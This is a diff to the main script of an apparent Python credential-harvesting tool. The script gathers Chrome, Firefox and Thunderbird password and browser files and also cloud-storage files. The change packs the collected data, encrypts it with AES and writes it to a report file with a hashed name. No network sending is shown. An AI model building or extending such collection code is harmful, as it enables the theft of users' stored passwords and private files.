@@ -9,8 +9,8 @@
 ###
 ####
 
-import cloud, browserfile, config, packetizer
-import os, subprocess
+import cloud, browserfile, config, packetizer, crypto, logger
+import os, subprocess, time, json
 
 def main():
 	# find passwords and browser files
@@ -18,9 +18,9 @@ def main():
 	ffList = browserfile.firefoxFinder()
 	thList = browserfile.thunderbirdFinder()
 	browserPackList = list()
-	browserPackList.append(packetizer.browserPack(chrome))
-	browserPackList.append(packetizer.browserPack(ffList))
-	browserPackList.append(packetizer.browserPack(thList))
+	browserPackList.append(chrome)
+	browserPackList.append(ffList)
+	browserPackList.append(thList)
 
 	# find cloud files
 	cloudPackList = list()
@@ -36,9 +36,19 @@ def main():
 
 	
 	#pack all together
-	print "\n\n====== JSON Formatted Values ======="
-	print packetizer.browserContainer(browserPackList)
-	print packetizer.cloudContainer(cloudPackList)
+	jsontext = packetizer.mainPacker(browserPackList, cloudPackList)
+	crypt = crypto.makeReport(crypto.encryptAES(jsontext))
+
+	# save into a file
+	try:
+		os.chdir(config.START_PATH)
+		fileName = crypto.md5(str(time.time())) + ".report"
+		f = open(fileName,"w+")
+		f.write(json.dumps(crypt, sort_keys=True, indent=4))
+		f.close()
+		logger.log("Report file written to " + os.path.join(config.START_PATH,fileName))
+	except Exception as e:
+		logger.log(e)
 
 if __name__ == "__main__":
 	main()
